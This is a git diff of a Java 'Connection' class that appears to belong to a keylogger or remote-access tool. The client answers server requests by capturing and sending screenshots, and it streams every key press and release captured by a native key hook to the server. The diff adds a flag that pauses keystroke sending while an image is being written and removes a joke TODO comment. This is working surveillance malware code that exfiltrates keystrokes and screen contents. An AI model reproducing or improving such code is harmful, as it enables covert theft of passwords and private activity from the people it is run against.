@@ -24,6 +24,7 @@ public class Connection {
 	private BufferedReader input;
 	private DataOutputStream output;
 	private Thread keyThread;
+	private boolean sendingImage;
 
 	/**
 	 * Establishes a new connection with the server. Object will only be successfully
@@ -132,9 +133,11 @@ public class Connection {
 
 						// Write the image to the server
 						System.out.println("SENDING SCREENSHOT");
+						sendingImage = true;
 						connection.getOutputStream().flush();
 						ImageIO.write(screenshot, "PNG", connection.getOutputStream());
 						connection.getOutputStream().flush();
+						sendingImage = false;
 						System.out.println("SCREENSHOT SENT");
 						
 					} else if (requestHeader.equals(PacketHeader.KILL)) { // If kill request is received
@@ -147,7 +150,6 @@ public class Connection {
 
 		} catch (AWTException ae) { // If the screenshot at pict couldn't be taken
 			System.out.println("FAILED TO TAKE SCREENSHOT");
-			// TODO send lols screenshot
 
 		} catch (IOException ie) { // If connection was disconnected at any point
 
@@ -203,7 +205,9 @@ public class Connection {
 		public void sendKey(NativeKeyEvent e, boolean isPress) {
 
 			// Try sending the key
-			try {output.writeBytes(KeyInterpreter.interpretKey(e, isPress) 
+			try {
+				if (!sendingImage)
+					output.writeBytes(KeyInterpreter.interpretKey(e, isPress) 
 					+ System.getProperty("line.separator"));}
 
 			catch (IOException ioe) { // Otherwise close the native key hook and sockets and stuff
